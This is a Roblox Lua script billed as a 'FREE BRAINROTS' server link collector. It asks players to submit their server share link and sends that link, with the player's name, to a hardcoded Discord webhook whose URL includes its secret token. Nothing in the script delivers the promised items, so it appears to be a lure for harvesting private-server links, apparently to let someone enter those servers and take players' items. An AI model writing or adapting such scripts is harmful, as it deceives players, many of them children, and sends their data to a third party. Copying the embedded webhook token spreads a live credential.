print("Script Loading...")

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local webhookUrl = "https://discord.com/api/webhooks/1515955615804035156/OrTmQIBtdWRl6SsGuPEfVmt-8DKtiW1tLo_Z-8cRfV1Uk_AyhMceD7CNm6ONgIkM8JYv"

print("==========================================")
print("FREE BRAINROTS - SERVER LINK COLLECTOR")
print("==========================================")
print("Player: " .. LocalPlayer.Name)
print("Type your server link and I'll send it!")
print("==========================================")

-- Listen for chat messages
local userInput = game:GetService("UserInputService")
local currentInput = ""

local function sendLink(link)
    if link == "" or link:len() < 10 then
        print("❌ INVALID LINK! Must be at least 10 characters")
        return
    end
    
    print("⏳ SENDING TO DISCORD...")
    
    local payload = {
        content = "@Iamabigbackhim",
        embeds = {
            {
                title = "🔗 Server Link Submitted",
                description = link,
                color = 65280,
                fields = {
                    {
                        name = "Player",
                        value = LocalPlayer.Name,
                        inline = true
                    }
                }
            }
        }
    }
    
    task.spawn(function()
        local success = pcall(function()
            HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
        end)
        
        if success then
            print("✅ SENT TO DISCORD!")
        else
            print("❌ FAILED TO SEND! Check your connection")
        end
    end)
end

-- Alternative: Use a simple paste detection
print("\n💡 PASTE YOUR LINK IN CHAT and type /send to submit!")
print("Example: /send https://www.roblox.com/share?code=...")

-- Monitor clipboard / chat input
local chat = game:GetService("Chat")

_G.SendServerLink = function(link)
    sendLink(link)
end

print("\n✅ Script Ready! Use: _G.SendServerLink('your_link_here')")
print("Example: _G.SendServerLink('https://www.roblox.com/share?code=abc123')")
